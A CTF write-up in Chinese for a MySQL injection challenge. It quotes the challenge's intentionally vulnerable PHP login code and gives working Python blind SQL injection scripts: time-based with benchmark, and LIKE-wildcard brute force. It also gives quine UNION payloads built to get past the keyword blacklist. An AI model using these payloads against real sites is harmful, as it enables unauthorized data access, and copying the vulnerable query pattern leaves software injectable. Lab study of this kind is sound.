# yet_another_mysql_injection

进入环境，先随便输入用户名和密码，显示只有admin可以登录

![image-20240324113951117](CTFhub%E9%A2%98%E8%A7%A3.assets/image-20240324113951117.png)

那就用户名密码都改成admin试试，显示hacker，后来发现是密码不能为admin，密码改为其它的显示something wrong

![image-20240324114025699](CTFhub%E9%A2%98%E8%A7%A3.assets/image-20240324114025699.png)

![image-20240324114059351](CTFhub%E9%A2%98%E8%A7%A3.assets/image-20240324114059351.png)

ctrl+u查看页面源代码，发现

![image-20240324114220847](CTFhub%E9%A2%98%E8%A7%A3.assets/image-20240324114220847.png)

访问source发现给出了源码

```php
<?php
include_once("lib.php");
function alertMes($mes,$url){
    die("<script>alert('{$mes}');location.href='{$url}';</script>");
}

function checkSql($s) { # 过滤了很多东西，密码为admin显示hacker的原因也在这
    if(preg_match("/regexp|between|in|flag|=|>|<|and|\||right|left|reverse|update|extractvalue|floor|substr|&|;|\\\$|0x|sleep|\ /i",$s)){
        alertMes('hacker', 'index.php');
    }
}

if (isset($_POST['username']) && $_POST['username'] != '' && isset($_POST['password']) && $_POST['password'] != '') {
    $username=$_POST['username'];
    $password=$_POST['password'];
    if ($username !== 'admin') { # 显示只有用户名为admin时才能登录
        alertMes('only admin can login', 'index.php');
    }
    checkSql($password);
    $sql="SELECT password FROM users WHERE username='admin' and password='$password';"; # sql查询语句
    $user_result=mysqli_query($con,$sql);
    $row = mysqli_fetch_array($user_result);
    if (!$row) {
        alertMes("something wrong",'index.php');
    }
    if ($row['password'] === $password) { # 如果密码正确，那么会直接给出flag
    die($FLAG);
    } else {
    alertMes("wrong password",'index.php');
  }
}

if(isset($_GET['source'])){
  show_source(__FILE__);
  die;
}
?>
```

经过分析，我认为可以使用时间盲注，=号可以用like替换，substr可以使用mid函数替换，/**/可以用来替换空格，benchmark函数可以用来替换sleep函数

```mysql
#! /usr/bin/python3
import requests
import time
url = "http://challenge-83413125beb6e4d2.sandbox.ctfhub.com:10800/index.php"
flag = ""
i = 0
while True:
    i += 1
    for j in range(32,129):
        data = {"username":"admin","password":"1'/**/or/**/if(ascii(mid((select/**/database()),{0},1))like/**/{1},benchmark(700000,md5('A')),benchmark(1,md5('A')))#".format(i,j)}
        start = time.time()
        r = requests.post(url = url, data = data)
        end = time.time() - start
        if end > 2:
            flag += chr(j)
            print(flag)
            break
爆数据库名，不过就三个字符花了好几分钟的时间去爆破
```

```py
#! /usr/bin/python3
import requests
import time
url = "http://challenge-83413125beb6e4d2.sandbox.ctfhub.com:10800/index.php"
flag = ""
i = 0
while True:
    i += 1
    for j in range(32,129):
        data = {"username":"admin","password":"1'/**/or/**/if(ascii(mid((select/**/group_concat(table_name)from(sys.schema_table_statistics_with_buffer.tables)where(table_schema/**/like/**/database())),{0},1))like/**/{1},benchmark(700000,md5('A')),benchmark(1,md5('A')))#".format(i,j)}
        start = time.time()
        r = requests.post(url = url, data = data)
        end = time.time() - start
        if end > 2:
            flag += chr(j)
            print(flag)
            break
这个地方也不知道是哪里写错了，死活不知道咋搞，所以这个路子行不通，也就放弃了，脚本运行半天蹦不出一个字符，就算可以，效率也极其低下
```

查看WP，发现了一种更好的脚本，这种就是直接匹配password，通过like和通配符%

```py
import requests,time
alp = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~"
def get_pass():
    url = "http://challenge-83413125beb6e4d2.sandbox.ctfhub.com:10800/index.php"
    flag = ""
    while True:
        for i in alp:
            data={"username":"admin","password":f"1'or/**/password/**/like/**/'{flag+i}%'#"}
            resp = requests.post(url=url,data=data)
            time.sleep(0.1)
            if "something wrong" not in resp.text:
                flag+=i
                print(flag)
                break
            elif "~" in i:
                return
get_pass()
```

又发现了一个问题，就是这个题目似乎有点毛病，它随机给出的密码中如果包含in、0x等被过滤掉的字符，那么就根本无法将密码爆破出来，而且输入进去也会被当作非法，提示hacker，就比如

![image-20240324140400273](CTFhub%E9%A2%98%E8%A7%A3.assets/image-20240324140400273.png)

![image-20240324140412546](CTFhub%E9%A2%98%E8%A7%A3.assets/image-20240324140412546.png)

得到密码cafu62gqtqnyhjdbfkftul2yavzalubo，登录后返回flag

还有一个方法是使用qunie，下面是payload，不是很懂，参考文章https://www.cnblogs.com/aninock/p/16467716.html

```
'/**/union/**/select/**/REPLACE(REPLACE('"/**/union/**/select/**/REPLACE(REPLACE("B",CHAR(34),CHAR(39)),CHAR(66),"B")#',CHAR(34),CHAR(39)),CHAR(66),'"/**/union/**/select/**/REPLACE(REPLACE("B",CHAR(34),CHAR(39)),CHAR(66),"B")#')#
```

```
' union select REPLACE(REPLACE('" union select REPLACE(REPLACE("B",CHAR(34),CHAR(39)),CHAR(66),"B")#',CHAR(34),CHAR(39)),CHAR(66),'" union select REPLACE(REPLACE("B",CHAR(34),CHAR(39)),CHAR(66),"B")#')#
```

